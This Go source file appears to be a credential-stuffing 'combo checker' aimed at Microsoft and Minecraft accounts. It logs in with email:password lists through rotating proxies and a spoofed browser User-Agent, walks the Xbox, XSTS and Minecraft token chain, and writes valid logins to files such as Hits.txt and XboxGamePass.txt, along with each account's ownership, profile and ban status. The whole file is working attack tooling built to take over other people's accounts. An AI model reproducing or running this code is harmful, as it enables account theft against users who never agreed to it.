package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"
)

const (
	loginURL     = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
	xboxURL      = "https://user.auth.xboxlive.com/user/authenticate"
	xstsURL      = "https://xsts.auth.xboxlive.com/xsts/authorize"
	mcAuthURL    = "https://api.minecraftservices.com/authentication/login_with_xbox"
	mcProfileURL = "https://api.minecraftservices.com/minecraft/profile"
	mcStoreURL   = "https://api.minecraftservices.com/entitlements/mcstore"
)

type AuthResult struct {
	Email       string
	Password    string
	Type        string
	AccType     string
	Username    string
	UUID        string
	Capes       string
	MCToken     string
	DonutStatus string
	DonutMoney  string
	DonutShards string
	// Hypixel
	HypixelBan string
}

type authSession struct {
	followClient     *http.Client // follows redirects — for GETs
	noRedirectClient *http.Client // stops at first redirect — for login POST
	cfg              *Config
}

func newSession(cfg *Config) *authSession {
	jar, _ := cookiejar.New(nil)
	transport := makeTransport(gProxies.proxyType, gProxies.random())

	followClient := &http.Client{
		Jar:       jar,
		Transport: transport,
		Timeout:   15 * time.Second,
	}
	noRedirectClient := &http.Client{
		Jar:       jar,
		Transport: transport,
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	return &authSession{followClient: followClient, noRedirectClient: noRedirectClient, cfg: cfg}
}

func doReq(client *http.Client, method, rawURL string, body io.Reader, ct string, headers map[string]string) (*http.Response, []byte, error) {
	req, err := http.NewRequest(method, rawURL, body)
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	if ct != "" {
		req.Header.Set("Content-Type", ct)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp, b, nil
}

var (
	rePPFT      = regexp.MustCompile(`name="PPFT"[^>]*value="([^"]+)"`)
	rePPFT2     = regexp.MustCompile(`value="([^"]+)"[^>]*name="PPFT"`)
	reURLPost   = regexp.MustCompile(`"urlPost"\s*:\s*"([^"]+)"`)
	reURLPost2  = regexp.MustCompile(`urlPost\s*:\s*'([^']+)'`)
	reIPT       = regexp.MustCompile(`"ipt"\s+value="([^"]+)"`)
	rePPRID     = regexp.MustCompile(`"pprid"\s+value="([^"]+)"`)
	reUAID      = regexp.MustCompile(`"uaid"\s+value="([^"]+)"`)
	reFmHF      = regexp.MustCompile(`id="fmHF"\s+action="([^"]+)"`)
	reReturnURL = regexp.MustCompile(`"recoveryCancel":\{"returnUrl":"([^"]+)"`)
)

func (s *authSession) getLoginForm() (sFTTag, urlPost string, err error) {
	// Use followClient so redirects are followed automatically
	_, body, err := doReq(s.followClient, "GET", loginURL, nil, "", nil)
	if err != nil {
		return
	}
	text := string(body)

	// Extract PPFT token
	if m := rePPFT.FindStringSubmatch(text); m != nil {
		sFTTag = m[1]
	} else if m := rePPFT2.FindStringSubmatch(text); m != nil {
		sFTTag = m[1]
	}
	if sFTTag == "" {
		err = fmt.Errorf("sFTTag not found")
		return
	}

	// Extract urlPost
	if m := reURLPost.FindStringSubmatch(text); m != nil {
		urlPost = unescapeUnicode(m[1])
	} else if m := reURLPost2.FindStringSubmatch(text); m != nil {
		urlPost = m[1]
	}
	if urlPost == "" {
		err = fmt.Errorf("urlPost not found")
		return
	}
	return
}

func (s *authSession) login(email, password, urlPost, sFTTag string) (rpsToken string, resultType string, err error) {
	data := url.Values{
		"login":    {email},
		"loginfmt": {email},
		"passwd":   {password},
		"PPFT":     {sFTTag},
	}

	resp, respBody, err := doReq(s.noRedirectClient, "POST", urlPost,
		strings.NewReader(data.Encode()), "application/x-www-form-urlencoded", nil)
	if err != nil {
		return "", "error", err
	}
	text := string(respBody)

	// Redirect with fragment = access token (main happy path)
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		loc := resp.Header.Get("Location")
		if loc != "" {
			if strings.Contains(loc, "#") {
				if token, ok := extractFragment(loc, "access_token"); ok && token != "" {
					return token, "hit", nil
				}
			}
			// Follow the redirect chain manually
			finalLoc, _, _ := s.manualFollow(loc, 8)
			if strings.Contains(finalLoc, "#") {
				if token, ok := extractFragment(finalLoc, "access_token"); ok && token != "" {
					return token, "hit", nil
				}
			}
		}
	}

	// Cancel / recovery flow
	if strings.Contains(text, "cancel?mkt=") {
		ipt := reMatch(text, reIPT)
		pprid := reMatch(text, rePPRID)
		uaid := reMatch(text, reUAID)
		action := reMatch(text, reFmHF)
		if ipt != "" && pprid != "" && uaid != "" && action != "" {
			d2 := url.Values{"ipt": {ipt}, "pprid": {pprid}, "uaid": {uaid}}
			_, b2, _ := doReq(s.noRedirectClient, "POST", action, strings.NewReader(d2.Encode()), "application/x-www-form-urlencoded", nil)
			returnURL := reMatch(string(b2), reReturnURL)
			if returnURL != "" {
				finalLoc, _, _ := s.manualFollow(unescapeUnicode(returnURL), 8)
				if strings.Contains(finalLoc, "#") {
					if token, ok := extractFragment(finalLoc, "access_token"); ok && token != "" {
						return token, "hit", nil
					}
				}
			}
		}
	}

	lower := strings.ToLower(text)

	// 2FA / verification
	if strings.Contains(lower, "recover?mkt") ||
		strings.Contains(lower, "identity/confirm") ||
		strings.Contains(lower, "email/confirm") ||
		strings.Contains(lower, "/abuse?mkt=") ||
		strings.Contains(lower, "proofs.microsoft.com") ||
		strings.Contains(lower, "two-step") ||
		strings.Contains(lower, "security code") ||
		strings.Contains(lower, "enter the code") ||
		strings.Contains(lower, "verify your identity") {
		return "", "2fa", nil
	}

	// Bad credentials
	if strings.Contains(lower, "password is incorrect") ||
		strings.Contains(lower, "account doesn") ||
		strings.Contains(lower, "sign in to your microsoft account") ||
		strings.Contains(lower, "tried to sign in too many times") ||
		strings.Contains(lower, "couldn't find") ||
		strings.Contains(lower, "account has been locked") {
		return "", "bad", nil
	}

	return "", "bad", nil
}

// manualFollow follows HTTP redirects without the Go http.Client redirect logic,
// so we can capture fragment-containing Location headers.
func (s *authSession) manualFollow(startURL string, maxHops int) (string, []byte, error) {
	current := startURL
	for i := 0; i < maxHops; i++ {
		if !strings.HasPrefix(current, "http") {
			break
		}
		resp, body, err := doReq(s.noRedirectClient, "GET", current, nil, "", nil)
		if err != nil {
			return current, body, err
		}
		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
			loc := resp.Header.Get("Location")
			if loc == "" {
				return current, body, nil
			}
			if strings.Contains(loc, "#") {
				return loc, body, nil
			}
			if !strings.HasPrefix(loc, "http") {
				base, _ := url.Parse(current)
				rel, _ := url.Parse(loc)
				loc = base.ResolveReference(rel).String()
			}
			current = loc
			continue
		}
		return current, body, nil
	}
	return current, nil, nil
}

func (s *authSession) xboxAuth(rpsToken string) (xboxToken, uhs string, err error) {
	payload := map[string]interface{}{
		"Properties":   map[string]interface{}{"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": rpsToken},
		"RelyingParty": "http://auth.xboxlive.com",
		"TokenType":    "JWT",
	}
	data, _ := json.Marshal(payload)
	_, body, err := doReq(s.followClient, "POST", xboxURL, bytes.NewReader(data), "application/json", map[string]string{"Accept": "application/json"})
	if err != nil {
		return
	}
	var js map[string]interface{}
	if e := json.Unmarshal(body, &js); e != nil {
		err = e
		return
	}
	xboxToken, _ = js["Token"].(string)
	if dc, ok := js["DisplayClaims"].(map[string]interface{}); ok {
		if xui, ok := dc["xui"].([]interface{}); ok && len(xui) > 0 {
			if item, ok := xui[0].(map[string]interface{}); ok {
				uhs, _ = item["uhs"].(string)
			}
		}
	}
	if xboxToken == "" {
		err = fmt.Errorf("empty xbox token")
	}
	return
}

func (s *authSession) xstsAuth(xboxToken string) (xstsToken string, err error) {
	payload := map[string]interface{}{
		"Properties":   map[string]interface{}{"SandboxId": "RETAIL", "UserTokens": []string{xboxToken}},
		"RelyingParty": "rp://api.minecraftservices.com/",
		"TokenType":    "JWT",
	}
	data, _ := json.Marshal(payload)
	_, body, err := doReq(s.followClient, "POST", xstsURL, bytes.NewReader(data), "application/json", map[string]string{"Accept": "application/json"})
	if err != nil {
		return
	}
	var js map[string]interface{}
	if e := json.Unmarshal(body, &js); e != nil {
		err = e
		return
	}
	xstsToken, _ = js["Token"].(string)
	if xstsToken == "" {
		err = fmt.Errorf("empty xsts token")
	}
	return
}

func (s *authSession) mcAuth(uhs, xstsToken string) (mcToken string, err error) {
	payload := map[string]string{"identityToken": fmt.Sprintf("XBL3.0 x=%s;%s", uhs, xstsToken)}
	data, _ := json.Marshal(payload)
	_, body, err := doReq(s.followClient, "POST", mcAuthURL, bytes.NewReader(data), "application/json", nil)
	if err != nil {
		return
	}
	var js map[string]interface{}
	if e := json.Unmarshal(body, &js); e != nil {
		err = e
		return
	}
	mcToken, _ = js["access_token"].(string)
	if mcToken == "" {
		err = fmt.Errorf("empty mc token")
	}
	return
}

func (s *authSession) checkOwnership(mcToken string) (accType string, err error) {
	_, body, err := doReq(s.followClient, "GET", mcStoreURL, nil, "", map[string]string{"Authorization": "Bearer " + mcToken})
	if err != nil {
		return
	}
	var js map[string]interface{}
	if e := json.Unmarshal(body, &js); e != nil {
		err = e
		return
	}
	items, _ := js["items"].([]interface{})
	hasNormal, hasXGPU, hasXGP := false, false, false
	for _, raw := range items {
		item, _ := raw.(map[string]interface{})
		name, _ := item["name"].(string)
		source, _ := item["source"].(string)
		switch name {
		case "game_minecraft", "product_minecraft":
			if source == "PURCHASE" || source == "MC_PURCHASE" {
				hasNormal = true
			}
		case "product_game_pass_ultimate":
			hasXGPU = true
		case "product_game_pass_pc":
			hasXGP = true
		}
	}
	raw := string(body)
	switch {
	case hasNormal && hasXGPU:
		accType = "Normal Minecraft (with Game Pass Ultimate)"
	case hasNormal && hasXGP:
		accType = "Normal Minecraft (with Game Pass)"
	case hasNormal:
		accType = "Normal Minecraft"
	case hasXGPU:
		accType = "Xbox Game Pass Ultimate"
	case hasXGP:
		accType = "Xbox Game Pass (PC)"
	default:
		var others []string
		if strings.Contains(raw, "product_minecraft_bedrock") {
			others = append(others, "Minecraft Bedrock")
		}
		if strings.Contains(raw, "product_legends") {
			others = append(others, "Minecraft Legends")
		}
		if strings.Contains(raw, "product_dungeons") {
			others = append(others, "Minecraft Dungeons")
		}
		if len(others) > 0 {
			accType = "Other (" + strings.Join(others, ", ") + ")"
		}
	}
	return
}

type MCProfile struct {
	ID    string `json:"id"`
	Name  string `json:"name"`
	Capes []struct {
		Alias string `json:"alias"`
	} `json:"capes"`
}

func (s *authSession) getMCProfile(mcToken string) (*MCProfile, error) {
	_, body, err := doReq(s.followClient, "GET", mcProfileURL, nil, "", map[string]string{"Authorization": "Bearer " + mcToken})
	if err != nil {
		return nil, err
	}
	var p MCProfile
	if e := json.Unmarshal(body, &p); e != nil {
		return nil, e
	}
	if p.ID == "" {
		return nil, fmt.Errorf("no profile")
	}
	return &p, nil
}

// CheckCombo runs the full auth chain.
func CheckCombo(cfg *Config, email, password string) *AuthResult {
	result := &AuthResult{Email: email, Password: password}
	sess := newSession(cfg)
	maxRetries := cfg.MaxRetries

	// Step 1: login form
	var sFTTag, urlPost string
	var err error
	for i := 0; i < maxRetries; i++ {
		sFTTag, urlPost, err = sess.getLoginForm()
		if err == nil {
			break
		}
		incRetry()
		time.Sleep(500 * time.Millisecond)
		sess = newSession(cfg)
	}
	if err != nil {
		incBad()
		result.Type = "Bad"
		return result
	}

	// Step 2: submit credentials
	var rpsToken, loginType string
	for i := 0; i < maxRetries; i++ {
		rpsToken, loginType, err = sess.login(email, password, urlPost, sFTTag)
		if loginType == "bad" || loginType == "2fa" || loginType == "hit" {
			break
		}
		incRetry()
		time.Sleep(500 * time.Millisecond)
		sFTTag, urlPost, err = sess.getLoginForm()
		if err != nil {
			sess = newSession(cfg)
			sFTTag, urlPost, _ = sess.getLoginForm()
		}
	}

	switch loginType {
	case "bad":
		incBad()
		result.Type = "Bad"
		return result
	case "2fa":
		inc2FA()
		result.Type = "2FA"
		AppendResult("2fa.txt", email+":"+password)
		return result
	}

	if rpsToken == "" {
		incBad()
		result.Type = "Bad"
		return result
	}

	// Steps 3-5: Xbox → XSTS → MC token
	xboxToken, uhs, err := sess.xboxAuth(rpsToken)
	if err != nil {
		incVM()
		result.Type = "ValidMail"
		AppendResult("Valid_Mail.txt", email+":"+password)
		return result
	}
	xstsToken, err := sess.xstsAuth(xboxToken)
	if err != nil {
		incVM()
		result.Type = "ValidMail"
		AppendResult("Valid_Mail.txt", email+":"+password)
		return result
	}
	mcToken, err := sess.mcAuth(uhs, xstsToken)
	if err != nil {
		incVM()
		result.Type = "ValidMail"
		AppendResult("Valid_Mail.txt", email+":"+password)
		return result
	}
	result.MCToken = mcToken

	// Step 6: ownership check
	accType, _ := sess.checkOwnership(mcToken)
	result.AccType = accType

	switch {
	case accType == "Xbox Game Pass Ultimate" || strings.Contains(accType, "with Game Pass Ultimate"):
		incXGPU()
		result.Type = "XGPU"
		AppendResult("XboxGamePassUltimate.txt", email+":"+password)
		AppendResult("Hits.txt", email+":"+password)
	case accType == "Xbox Game Pass (PC)" || strings.Contains(accType, "with Game Pass)"):
		incXGP()
		result.Type = "XGP"
		AppendResult("XboxGamePass.txt", email+":"+password)
		AppendResult("Hits.txt", email+":"+password)
	case accType == "Normal Minecraft":
		incHit()
		result.Type = "Hit"
		AppendResult("Hits.txt", email+":"+password)
	case strings.HasPrefix(accType, "Other"):
		incOther()
		result.Type = "Other"
		AppendResult("Other.txt", email+":"+password+" | "+accType)
		AppendResult("Hits.txt", email+":"+password)
	default:
		incVM()
		result.Type = "ValidMail"
		AppendResult("Valid_Mail.txt", email+":"+password)
		return result
	}

	// Step 7: MC profile
	profile, err := sess.getMCProfile(mcToken)
	if err == nil {
		result.Username = profile.Name
		result.UUID = profile.ID
		var capeNames []string
		for _, c := range profile.Capes {
			capeNames = append(capeNames, c.Alias)
		}
		if len(capeNames) > 0 {
			result.Capes = strings.Join(capeNames, ", ")
		}
	} else {
		result.Username = "N/A"
	}

	// Donut check (HTTP API)
	if cfg.DonutCheck && result.Username != "" && result.Username != "N/A" {
		CheckDonut(result)
	}

	// Hypixel ban check (connects to mc.hypixel.net, same as bot.py)
	if result.UUID != "" && result.UUID != "N/A" {
		CheckHypixelBan(result)
	}

	return result
}

// ── helpers ──────────────────────────────────────────────────────────────────

func extractFragment(rawURL, key string) (string, bool) {
	idx := strings.Index(rawURL, "#")
	if idx == -1 {
		return "", false
	}
	params, err := url.ParseQuery(rawURL[idx+1:])
	if err != nil {
		return "", false
	}
	v := params.Get(key)
	return v, v != ""
}

func reMatch(text string, re *regexp.Regexp) string {
	m := re.FindStringSubmatch(text)
	if m == nil {
		return ""
	}
	return m[1]
}

func unescapeUnicode(s string) string {
	s = strings.ReplaceAll(s, `\u0026`, "&")
	s = strings.ReplaceAll(s, `\u003d`, "=")
	s = strings.ReplaceAll(s, `\u003D`, "=")
	return s
}
